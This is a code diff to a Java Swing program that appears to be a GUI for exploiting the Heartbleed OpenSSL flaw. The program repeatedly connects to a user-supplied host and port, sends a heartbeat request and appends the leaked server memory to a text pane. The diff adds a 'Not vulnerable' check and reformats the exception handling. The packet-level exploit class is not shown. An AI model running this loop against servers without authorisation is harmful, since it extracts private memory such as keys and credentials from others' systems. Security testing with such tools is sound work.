@@ -5,7 +5,6 @@
  */
 package br.com.radaction.main;
 
-import java.awt.Image;
 import java.awt.Toolkit;
 import java.io.IOException;
 import java.net.InetAddress;
@@ -14,7 +13,6 @@ import java.util.logging.Level;
 import java.util.logging.Logger;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
-import javax.swing.ImageIcon;
 import javax.swing.JOptionPane;
 import javax.swing.SwingUtilities;
 import javax.swing.text.BadLocationException;
@@ -35,7 +33,7 @@ public class AppHbExplorer extends javax.swing.JFrame {
 
     public AppHbExplorer() {
         initComponents();
-        
+
         setIcon();
     }
 
@@ -141,13 +139,17 @@ public class AppHbExplorer extends javax.swing.JFrame {
                     break;
                 }
             }
-        } catch (ClassNotFoundException ex) {
+        }
+        catch (ClassNotFoundException ex) {
             java.util.logging.Logger.getLogger(AppHbExplorer.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
-        } catch (InstantiationException ex) {
+        }
+        catch (InstantiationException ex) {
             java.util.logging.Logger.getLogger(AppHbExplorer.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
-        } catch (IllegalAccessException ex) {
+        }
+        catch (IllegalAccessException ex) {
             java.util.logging.Logger.getLogger(AppHbExplorer.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
-        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
+        }
+        catch (javax.swing.UnsupportedLookAndFeelException ex) {
             java.util.logging.Logger.getLogger(AppHbExplorer.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
         }
         //</editor-fold>
@@ -183,12 +185,14 @@ public class AppHbExplorer extends javax.swing.JFrame {
 
     private void start() {
         Thread worker = new Thread() {
+            @Override
             public void run() {
 
                 while (continueThread) {
                     try {
                         SwingUtilities.invokeLater(new Runnable() {
-                            public void run() {
+                            @Override
+                            public synchronized void run() {
                                 try {
                                     InetAddress ipTarget = InetAddress.getByName(txtIpAddr.getText());
                                     HeartBleed hb = new HeartBleed();
@@ -197,11 +201,21 @@ public class AppHbExplorer extends javax.swing.JFrame {
                                         try {
                                             hb.connect(txtIpAddr.getText(), Integer.valueOf(txtPort.getText()));
                                             hb.hello();
-                                            hb.heartBeat("");
-                                            if (!txtpTextOfServer.getText().contains(hb.getMemoryMessage())) {
-                                                sd.insertString(sd.getLength(), hb.getMemoryMessage() + "\n", null);
+                                            boolean isVul = hb.heartBeat("");
+                                            if (isVul) {
+                                                if (!txtpTextOfServer.getText().contains(hb.getMemoryMessage())) {
+                                                    sd.insertString(sd.getLength(), hb.getMemoryMessage() + "\n", null);
+                                                }                                                
+                                            }else {
+                                                Thread.currentThread().interrupt();
+                                                JOptionPane.showMessageDialog(rootPane, "Not vulnerable!!!");
+                                                txtIpAddr.requestFocus();
+                                                tbtStartStop.setSelected(false);
+                                                tbtStartStop.setText("Start");
+                                                continueThread = false;
                                             }
-                                        } catch (BadLocationException ex) {
+                                        }
+                                        catch (BadLocationException ex) {
                                             Logger.getLogger(AppHbExplorer.class.getName()).log(Level.SEVERE, null, ex);
                                             JOptionPane.showMessageDialog(rootPane, "Can't possible connect!!");
                                             txtIpAddr.requestFocus();
@@ -209,7 +223,8 @@ public class AppHbExplorer extends javax.swing.JFrame {
                                             tbtStartStop.setText("Start");
                                             Thread.currentThread().interrupt();
                                             continueThread = false;
-                                        } catch (IOException ex) {
+                                        }
+                                        catch (IOException ex) {
                                             Logger.getLogger(AppHbExplorer.class.getName()).log(Level.SEVERE, null, ex);
                                             JOptionPane.showMessageDialog(rootPane, "Can't possible connect!!");
                                             txtIpAddr.requestFocus();
@@ -226,7 +241,8 @@ public class AppHbExplorer extends javax.swing.JFrame {
                                         Thread.currentThread().interrupt();
                                         continueThread = false;
                                     }
-                                } catch (UnknownHostException ex) {
+                                }
+                                catch (UnknownHostException ex) {
                                     Logger.getLogger(AppHbExplorer.class.getName()).log(Level.SEVERE, null, ex);
                                     JOptionPane.showMessageDialog(rootPane, "Can't possible connect!!");
                                     txtIpAddr.requestFocus();
@@ -235,7 +251,8 @@ public class AppHbExplorer extends javax.swing.JFrame {
                                     Thread.currentThread().interrupt();
                                     continueThread = false;
 
-                                } catch (IOException ex) {
+                                }
+                                catch (IOException ex) {
                                     Logger.getLogger(AppHbExplorer.class.getName()).log(Level.SEVERE, null, ex);
                                     JOptionPane.showMessageDialog(rootPane, "Can't possible connect!!");
                                     txtIpAddr.requestFocus();
@@ -255,7 +272,8 @@ public class AppHbExplorer extends javax.swing.JFrame {
                             Thread.currentThread().interrupt();
                         }
                         Thread.sleep(2000);
-                    } catch (InterruptedException ex) {
+                    }
+                    catch (InterruptedException ex) {
                         Logger.getLogger(AppHbExplorer.class.getName()).log(Level.SEVERE, null, ex);
                     }
                 }
